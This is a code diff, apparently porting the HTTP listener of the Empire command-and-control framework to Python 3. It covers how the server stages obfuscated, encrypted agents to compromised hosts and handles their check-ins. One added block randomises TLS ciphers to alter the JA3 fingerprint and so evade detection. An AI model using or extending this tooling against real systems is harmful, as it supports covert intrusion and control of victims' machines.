-                            elif results.startswith('ERROR:'):
+                            elif results.startswith(b'ERROR:'):
                                 listenerName = self.options['Name']['Value']
-                                message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(request_uri, clientIP, results)
+                                message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(
+                                    request_uri, clientIP, results)
                                 signal = json.dumps({
                                     'print': True,
                                     'message': message
@@ -734,7 +827,7 @@ class Listener:
 
                                 if 'not in cache' in results:
                                     # signal the client to restage
-                                    print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
+                                    print(helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP)))
                                     return make_response(self.default_response(), 401)
                                 else:
                                     return make_response(self.default_response(), 404)
@@ -744,7 +837,7 @@ class Listener:
                                 listenerName = self.options['Name']['Value']
                                 message = "[*] Agent from {} retrieved taskings".format(clientIP)
                                 signal = json.dumps({
-                                    'print': True,
+                                    'print': False,
                                     'message': message
                                 })
                                 dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
@@ -765,7 +858,6 @@ class Listener:
                 dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                 return make_response(self.default_response(), 404)
 
-
         @app.route('/<path:request_uri>', methods=['POST'])
         def handle_post(request_uri):
             """
@@ -785,10 +877,12 @@ class Listener:
             dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, requestData, listenerOptions, clientIP)
             if dataResults and len(dataResults) > 0:
                 for (language, results) in dataResults:
+                    if isinstance(results, str):
+                        results = results.encode('UTF-8')
                     if results:
-                        if results.startswith('STAGE2'):
+                        if results.startswith(b'STAGE2'):
                             # TODO: document the exact results structure returned
-                            sessionID = results.split(' ')[1].strip()
+                            sessionID = results.split(b' ')[1].strip().decode('UTF-8')
                             sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
 
                             listenerName = self.options['Name']['Value']
@@ -800,13 +894,15 @@ class Listener:
                             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
 
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
-                            agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
+                            agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions,
+                                                            obfuscate=self.mainMenu.obfuscate,
+                                                            obfuscationCommand=self.mainMenu.obfuscateCommand)
                             encrypted_agent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                             # TODO: wrap ^ in a routing packet?
 
                             return make_response(base64.b64encode(encrypted_agent), 200)
 
-                        elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
+                        elif results[:10].lower().startswith(b'error') or results[:10].lower().startswith(b'exception'):
                             listenerName = self.options['Name']['Value']
                             message = "[!] Error returned for results by {} : {}".format(clientIP, results)
                             signal = json.dumps({
@@ -815,11 +911,11 @@ class Listener:
                             })
                             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                             return make_response(self.default_response(), 200)
-                        elif results == 'VALID':
+                        elif results == b'VALID':
                             listenerName = self.options['Name']['Value']
                             message = "[*] Valid results return by {}".format(clientIP)
                             signal = json.dumps({
-                                'print': True,
+                                'print': False,
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
@@ -847,7 +943,13 @@ class Listener:
                     proto = ssl.PROTOCOL_SSLv23
 
                 context = ssl.SSLContext(proto)
-                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
+                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key" % (certPath))
+                # setting the cipher list allows for modification of the JA3 signature. Select a random cipher to change
+                # it every time the listener is launched
+                cipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
+                              "ECDHE-RSA-AES256-SHA", "AES256-SHA256", "AES128-SHA256"]
+                selectciph = random.choice(cipherlist)
+                context.set_ciphers(selectciph)
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
@@ -861,7 +963,6 @@ class Listener:
                 'message': message
             })
             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
-
 
     def start(self, name=''):
         """
@@ -883,7 +984,6 @@ class Listener:
             # returns True if the listener successfully started, false otherwise
             return self.threads[name].is_alive()
 
-
     def shutdown(self, name=''):
         """
         Terminates the server thread stored in the self.threads dictionary,
@@ -891,8 +991,8 @@ class Listener:
         """
 
         if name and name != '':
-            print helpers.color("[!] Killing listener '%s'" % (name))
+            print(helpers.color("[!] Killing listener '%s'" % (name)))
             self.threads[name].kill()
         else:
-            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
+            print(helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value'])))
             self.threads[self.options['Name']['Value']].kill()
